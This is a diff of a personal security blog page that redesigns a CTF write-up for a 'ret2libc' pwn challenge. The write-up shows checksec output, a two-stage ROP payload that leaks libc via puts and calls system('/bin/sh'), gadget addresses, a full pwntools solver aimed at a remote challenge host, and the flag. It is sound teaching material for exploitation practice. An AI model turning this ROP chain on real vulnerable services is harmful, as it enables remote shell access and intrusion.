@@ -1,258 +1,185 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ret2libc // r3t0x</title>
-    <link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml">
-    <meta name="description" content="Classic return-to-libc attack. The stack is non-executable, but libc is loaded and ready. Leak a libc address, calculate offsets, and chain system(&#34;/b">
-    <link rel="stylesheet" href="../../../../static/css/style.css?v=43fea522e0ce">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#0c0c0e">
+<title>ret2libc — MOJO-JOJO CTF — r3t0x</title>
+<meta name="description" content="Classic return-to-libc attack. The stack is non-executable, but libc is loaded and ready. Leak a libc address, calculate offsets, and chain system(&quot;/b…">
+<meta name="author" content="Ghaith Amdouni">
+<link rel="canonical" href="https://r3t0x.me/challenge/mojo-jojo/pwn/ret2libc/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2libc — MOJO-JOJO CTF — r3t0x">
+<meta property="og:description" content="Classic return-to-libc attack. The stack is non-executable, but libc is loaded and ready. Leak a libc address, calculate offsets, and chain system(&quot;/b…">
+<meta property="og:url" content="https://r3t0x.me/challenge/mojo-jojo/pwn/ret2libc/">
+<meta property="og:image" content="https://r3t0x.me/static/img/social-card.png">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml">
+<link rel="alternate" type="application/rss+xml" title="r3t0x — writeups" href="/feed.xml">
+<link rel="stylesheet" href="/static/css/main.css?v=f322459a0a">
+<script src="/static/js/main.js?v=f322459a0a" defer></script>
 </head>
 <body>
-    <!-- Genjutsu Transition Overlay -->
-    <div class="genjutsu-overlay initial-closed" id="genjutsuOverlay">
-        <div class="eyelid eyelid-top"></div>
-        <div class="eyelid eyelid-bottom"></div>
-        <div class="genjutsu-eye">
-                <svg viewBox="0 0 200 200">
-                    <circle cx="100" cy="100" r="94" fill="var(--blood-red)" stroke="#000" stroke-width="10"/>
-                    <!-- Base 3-Tomoe -->
-                    <g class="base-sharingan" style="transform-origin: 100px 100px;">
-                        <circle cx="100" cy="100" r="90" fill="var(--blood-red)"/>
-                        <circle cx="100" cy="100" r="16" fill="#000"/>
-                        <circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/>
-                        <g class="tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
-                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(120deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
-                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(240deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
-                    </g>
-                    <!-- Uploaded Image Mangekyo -->
-                    <defs>
-                        <clipPath id="circleClip">
-                            <circle cx="100" cy="100" r="98" />
-                        </clipPath>
-                    </defs>
-                    <image href="../../../../static/img/mangekyou.png" x="0" y="0" height="200" width="200" class="mangekyo" style="transform-origin: 100px 100px; opacity: 0; clip-path: url(#circleClip);" />
-                </svg>
-        </div>
-    </div>
-    <div class="scanlines"></div>
-    <div class="scroll-indicator" id="scrollIndicator"></div>
-    <div class="scroll-addr" id="scrollAddr">0x00000000</div>
-    <div class="pwndbg-bg" id="pwndbgBg"></div>
-
-    <div class="container" style="gap: 40px;">
-
-        <a href="../../../../index.html" class="back-link">← pwndbg> back</a>
-
-        <div class="chall-header">
-            <h1><span class="prefix">./</span>ret2libc<span class="cursor-blink">_</span></h1>
-            <div class="chall-meta-row">
-                <span class="tag">PWN</span>
-                <span>MOJO-JOJO CTF</span>
-                <span>0x008cae62</span>
-                <span>by r3t0x</span>
-                
-                <span>
-                    <span class="difficulty">
-                        
-                        <span class="diff-dot filled"></span>
-                        
-                        <span class="diff-dot filled"></span>
-                        
-                        <span class="diff-dot "></span>
-                        
-                        <span class="diff-dot "></span>
-                        
-                        <span class="diff-dot "></span>
-                        
-                    </span>
-                </span>
-            </div>
-        </div>
-
-        <!-- Description -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">DESCRIPTION</div>
-            <div class="code-block">
-                Classic return-to-libc attack. The stack is non-executable, but libc is loaded and ready. Leak a libc address, calculate offsets, and chain system(&#34;/bin/sh&#34;) to claim your shell.
-            </div>
-        </div>
-
-
-
-        
-
-        
-        <!-- Writeup -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">WRITEUP // WALKTHROUGH</div>
-            <div class="writeup-content">
-                <h1>The Archive's Whisper (ret2libc) — Writeup</h1>
-<h2>Challenge Overview</h2>
-<table>
-<thead>
-<tr>
-<th>Field</th>
-<th>Value</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>Category</strong></td>
-<td>PWN</td>
-</tr>
-<tr>
-<td><strong>Difficulty</strong></td>
-<td>Medium</td>
-</tr>
-<tr>
-<td><strong>Author</strong></td>
-<td>r3t0x</td>
-</tr>
-<tr>
-<td><strong>Technique</strong></td>
-<td>ret2libc via ROP Chain</td>
-</tr>
-</tbody>
-</table>
-<h2>Reconnaissance</h2>
-<div class="codehilite"><pre><span></span><code>pwndbg&gt;<span class="w"> </span>checksec<span class="w"> </span>./main
-<span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
-<span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO
-<span class="w">    </span>Stack:<span class="w">    </span>No<span class="w"> </span>canary<span class="w"> </span>found
-<span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled
-<span class="w">    </span>PIE:<span class="w">      </span>No<span class="w"> </span>PIE<span class="w"> </span><span class="o">(</span>0x400000<span class="o">)</span>
-</code></pre></div>
+<a class="skip" href="#main">Skip to content</a>
+<header class="masthead">
+  <div class="shell">
+    <a class="brand" href="/"><img class="mark" src="/static/img/mangekyou.png" alt="" width="20" height="20" loading="lazy" decoding="async"><span>r3t0x</span></a>
+    <nav aria-label="Main"><a href="/">home</a><a href="/blog/" aria-current="page">writeups</a><a href="/projects/">projects</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>cv</a></nav>
+    <button type="button" class="search-open" data-open-search aria-label="Search the site">search<kbd>/</kbd></button>
+  </div>
+</header>
+<main id="main"><div class="shell narrow"><article class="writeup">
+  <header class="page-head">
+    <p class="kicker"><a href="/blog/#mojo-jojo-ctf">MOJO-JOJO CTF</a> / pwn</p>
+    <h1>ret2libc</h1>
+    <p class="lede">Classic return-to-libc attack. The stack is non-executable, but libc is loaded and ready. Leak a libc address, calculate offsets, and chain system(&quot;/b…</p>
+    <dl class="facts">
+      <div><dt>difficulty</dt><dd>easy</dd></div>
+      <div><dt>points</dt><dd>—</dd></div>
+      <div><dt>published</dt><dd><time datetime="2026-09-28">28 Sept 2026</time></dd></div>
+      <div><dt>author</dt><dd>r3t0x</dd></div>
+    </dl>
+    <p class="tags"><span>ret2libc via ROP Chain</span></p>
+  </header>
+  <nav class="toc" aria-label="On this page"><p>contents</p><ol><li><a href="#reconnaissance">Reconnaissance</a></li><li><a href="#exploit-strategy-two-stage-rop">Exploit Strategy: Two-Stage ROP</a></li><li><a href="#key-addresses">Key Addresses</a></li><li><a href="#result">Result</a></li><li><a href="#solver">Reference solver</a></li><li><a href="#flag">Flag</a></li></ol></nav>
+  <div class="prose">
+    <h2 id="reconnaissance">Reconnaissance</h2>
+<figure class="code"><figcaption><span>console</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>pwndbg&gt; checksec ./main
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)</code></pre></figure>
 
 <p>NX is enabled, so we can't execute shellcode on the stack. But with <strong>no canary</strong>, <strong>no PIE</strong>, and <strong>Partial RELRO</strong>, we can build a ROP chain to leak libc and call <code>system("/bin/sh")</code>.</p>
-<h2>Exploit Strategy: Two-Stage ROP</h2>
-<h3>Stage 1: Leak libc base</h3>
+<h2 id="exploit-strategy-two-stage-rop">Exploit Strategy: Two-Stage ROP</h2>
+<h3 id="stage-1-leak-libc-base">Stage 1: Leak libc base</h3>
 <p>We use <code>puts@plt</code> to print the runtime address of <code>puts@got</code>, which leaks a libc pointer. Then we return to <code>main</code> for a second input.</p>
-<div class="codehilite"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
-    <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">72</span><span class="p">,</span>         <span class="c1"># offset to RIP</span>
-    <span class="n">POP_RDI</span><span class="p">,</span> <span class="n">puts_got</span><span class="p">,</span> <span class="c1"># rdi = puts@got</span>
-    <span class="n">puts_plt</span><span class="p">,</span>          <span class="c1"># call puts(puts@got) → leaks libc addr</span>
-    <span class="n">main</span>               <span class="c1"># return to main for round 2</span>
-<span class="p">)</span>
-</code></pre></div>
+<figure class="code"><figcaption><span>output</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>payload = flat(
+    b'A' * 72,         # offset to RIP
+    POP_RDI, puts_got, # rdi = puts@got
+    puts_plt,          # call puts(puts@got) → leaks libc addr
+    main               # return to main for round 2
+)</code></pre></figure>
 
-<h3>Stage 2: Spawn shell</h3>
+<h3 id="stage-2-spawn-shell">Stage 2: Spawn shell</h3>
 <p>With the leaked libc address, we calculate <code>system()</code> and <code>"/bin/sh"</code> addresses, then build the final chain.</p>
-<div class="codehilite"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
-    <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">72</span><span class="p">,</span>
-    <span class="n">RET</span><span class="p">,</span>               <span class="c1"># stack alignment</span>
-    <span class="n">POP_RDI</span><span class="p">,</span> <span class="n">binsh</span><span class="p">,</span>    <span class="c1"># rdi = &quot;/bin/sh&quot;</span>
-    <span class="n">system</span>             <span class="c1"># system(&quot;/bin/sh&quot;)</span>
-<span class="p">)</span>
-</code></pre></div>
+<figure class="code"><figcaption><span>output</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>payload = flat(
+    b'A' * 72,
+    RET,               # stack alignment
+    POP_RDI, binsh,    # rdi = &quot;/bin/sh&quot;
+    system             # system(&quot;/bin/sh&quot;)
+)</code></pre></figure>
 
-<h2>Key Addresses</h2>
-<div class="codehilite"><pre><span></span><code>POP_RDI   = 0x40114a
+<h2 id="key-addresses">Key Addresses</h2>
+<figure class="code"><figcaption><span>output</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>POP_RDI   = 0x40114a
 RET       = 0x40114b
-OFFSET    = 72 bytes
-</code></pre></div>
+OFFSET    = 72 bytes</code></pre></figure>
 
-<h2>Result</h2>
-<div class="codehilite"><pre><span></span><code>[*] Stage 1: Leaking libc base...
+<h2 id="result">Result</h2>
+<figure class="code"><figcaption><span>console</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>[*] Stage 1: Leaking libc base...
 [+] Libc base: 0x7f7a8c200000
 [*] Stage 2: Spawning shell...
 [+] Enjoy your shell!
 $ cat flag.txt
-MOJO-JOJO{r3t2l1bc_cl4ss1c_m0v3}
-</code></pre></div>
-            </div>
-        </div>
-        
+MOJO-JOJO{r3t2l1bc_cl4ss1c_m0v3}</code></pre></figure>
+    <h2 id="solver">Reference solver</h2>
+    <figure class="code"><figcaption><span>solve.py</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code class="language-python"><span class="t-c">#!/usr/bin/env python3</span>
+<span class="t-k">from</span> pwn <span class="t-k">import</span> *
 
-        
-        <!-- Exploit / Solver -->
-        <div class="pwndbg-section">
-            <div class="pwndbg-title">EXECUTION // EXPLOIT</div>
-            <div style="color: var(--text-muted); margin-bottom: 10px; font-size: 0.85rem;">
-                <span style="color: var(--gdb-green);">$</span> python3 solve.py
-            </div>
-            <div class="code-block" style="max-height: 600px; overflow-y: auto;">
-                <pre style="margin: 0; padding: 0; background: none; border: none;">#!/usr/bin/env python3
-from pwn import *
+binary = <span class="t-s">'./main'</span>
+libc_path = <span class="t-s">'./libc.so.6'</span>
 
-binary = &#39;./main&#39;
-libc_path = &#39;./libc.so.6&#39;
+POP_RDI = <span class="t-m">0x40114a</span>
+RET = <span class="t-m">0x40114b</span>
+OFFSET = <span class="t-m">72</span>
 
-POP_RDI = 0x40114a
-RET = 0x40114b
-OFFSET = 72
+<span class="t-c"># Libc offsets</span>
+PUTS_OFFSET = <span class="t-m">0x805a0</span>
+SYSTEM_OFFSET = <span class="t-m">0x53110</span>
+BINSH_OFFSET = <span class="t-m">0x1a7ea4</span>
 
-# Libc offsets
-PUTS_OFFSET = 0x805a0
-SYSTEM_OFFSET = 0x53110
-BINSH_OFFSET = 0x1a7ea4
+<span class="t-k">def</span> <span class="t-f">exploit</span>(io):
+    elf = <span class="t-f">ELF</span>(binary, checksec=<span class="t-k">False</span>)
 
-def exploit(io):
-    elf = ELF(binary, checksec=False)
+    <span class="t-c"># Addresses</span>
+    puts_plt = elf.plt[<span class="t-s">'puts'</span>]
+    puts_got = elf.got[<span class="t-s">'puts'</span>]
+    main = elf.symbols[<span class="t-s">'main'</span>]
 
-    # Addresses
-    puts_plt = elf.plt[&#39;puts&#39;]
-    puts_got = elf.got[&#39;puts&#39;]
-    main = elf.symbols[&#39;main&#39;]
+    <span class="t-c"># Stage 1: Leak libc</span>
+    log.<span class="t-f">info</span>(<span class="t-s">&quot;Stage 1: Leaking libc base...&quot;</span>)
 
-    # Stage 1: Leak libc
-    log.info(&#34;Stage 1: Leaking libc base...&#34;)
+    io.<span class="t-f">recvuntil</span>(b<span class="t-s">'data:'</span>)
 
-    io.recvuntil(b&#39;data:&#39;)
-
-    payload = flat(
-        b&#39;A&#39; * OFFSET,
+    payload = <span class="t-f">flat</span>(
+        b<span class="t-s">'A'</span> * OFFSET,
         POP_RDI, puts_got,
         puts_plt,
         main
     )
-    io.sendline(payload)
+    io.<span class="t-f">sendline</span>(payload)
 
-    # Parse leak
-    io.recvline()
-    leak = u64(io.recvline().strip().ljust(8, b&#39;\x00&#39;))
+    <span class="t-c"># Parse leak</span>
+    io.<span class="t-f">recvline</span>()
+    leak = <span class="t-f">u64</span>(io.<span class="t-f">recvline</span>().<span class="t-f">strip</span>().<span class="t-f">ljust</span>(<span class="t-m">8</span>, b<span class="t-s">'\x00'</span>))
 
     libc_base = leak - PUTS_OFFSET
     system = libc_base + SYSTEM_OFFSET
     binsh = libc_base + BINSH_OFFSET
 
-    log.success(f&#34;Libc base: {hex(libc_base)}&#34;)
+    log.<span class="t-f">success</span>(f<span class="t-s">&quot;Libc base: {hex(libc_base)}&quot;</span>)
 
-    log.info(&#34;Stage 2: Spawning shell...&#34;)
+    log.<span class="t-f">info</span>(<span class="t-s">&quot;Stage 2: Spawning shell...&quot;</span>)
 
-    io.recvuntil(b&#39;data:&#39;)
+    io.<span class="t-f">recvuntil</span>(b<span class="t-s">'data:'</span>)
 
-    payload = flat(
-        b&#39;A&#39; * OFFSET,
-        RET,           # Align stack
+    payload = <span class="t-f">flat</span>(
+        b<span class="t-s">'A'</span> * OFFSET,
+        RET,           <span class="t-c"># Align stack</span>
         POP_RDI, binsh,
         system
     )
-    io.sendline(payload)
+    io.<span class="t-f">sendline</span>(payload)
 
-    log.success(&#34;Enjoy your shell!&#34;)
-    io.interactive()
+    log.<span class="t-f">success</span>(<span class="t-s">&quot;Enjoy your shell!&quot;</span>)
+    io.<span class="t-f">interactive</span>()
 
-if __name__ == &#39;__main__&#39;:
-    context.log_level = &#39;info&#39;
-    context.arch = &#39;amd64&#39;
+<span class="t-k">if</span> __name__ == <span class="t-s">'__main__'</span>:
+    context.log_level = <span class="t-s">'info'</span>
+    context.arch = <span class="t-s">'amd64'</span>
 
-    if args.REMOTE:
-        host = args.HOST or &#39;localhost&#39;
-        port = int(args.PORT or 2711)
-        io = remote(&#39;4.233.210.175&#39;,9002)
-    else:
-        io = process(binary)
+    <span class="t-k">if</span> args.REMOTE:
+        host = args.HOST <span class="t-k">or</span> <span class="t-s">'localhost'</span>
+        port = <span class="t-f">int</span>(args.PORT <span class="t-k">or</span> <span class="t-m">2711</span>)
+        io = <span class="t-f">remote</span>(<span class="t-s">'4.233.210.175'</span>,<span class="t-m">9002</span>)
+    <span class="t-k">else</span>:
+        io = <span class="t-f">process</span>(binary)
 
-    exploit(io)
-</pre>
-            </div>
-        </div>
-        
-
-        <div style="height: 80px;"></div>
-    </div>
-
-    <script src="../../../../static/js/main.js?v=43fea522e0ce"></script>
+    <span class="t-f">exploit</span>(io)</code></pre></figure>
+    <h2 id="flag">Flag</h2>
+    <p class="flag"><code>MOJO-JOJO{r3t2l1bc_cl4ss1c_m0v3}</code><button type="button" class="copy" data-copy>copy</button></p>
+  </div>
+  <nav class="pager" aria-label="More writeups">
+    <span></span>
+    <a class="next" href="/challenge/mojo-jojo/pwn/warmup/"><span>next</span><strong>Warmup</strong></a>
+  </nav>
+</article></div></main>
+<footer class="colophon">
+  <div class="shell">
+    <p><strong>Ghaith Amdouni</strong> · Binary exploitation &amp; systems · Tunis, Tunisia</p>
+    <nav aria-label="Elsewhere"><a href="https://github.com/Ghaith-amdouni">GitHub</a><a href="https://www.linkedin.com/in/amdouni-ghaith">LinkedIn</a><a href="https://www.credly.com/users/ghaith-amdouni">Credly</a><a href="/feed.xml">RSS</a><a href="mailto:ghaith.amdouni@insat.ucar.tn">email</a></nav>
+    <p class="fine">© 2026 Ghaith Amdouni · <a href="https://github.com/Ghaith-amdouni/ghaith-amdouni.github.io">site source</a><img class="hits" src="https://hits.sh/r3t0x.me.svg?view=total&style=flat-square&label=visits&color=161619&labelColor=0c0c0e" alt="" width="88" height="20" loading="lazy"></p>
+  </div>
+</footer>
+<dialog id="search" aria-label="Search">
+  <form method="dialog" class="search-head">
+    <label for="search-input"><span aria-hidden="true">&gt;</span><span class="sr-only">Search writeups, projects and pages</span></label>
+    <input id="search-input" type="search" placeholder="search writeups, projects, pages" autocomplete="off" spellcheck="false">
+    <button value="close" aria-label="Close search">esc</button>
+  </form>
+  <ul id="search-results"></ul>
+  <p class="search-foot"><span id="search-count">start typing</span><span>&uarr;&darr; move · enter open</span></p>
+</dialog>
 </body>
 </html>
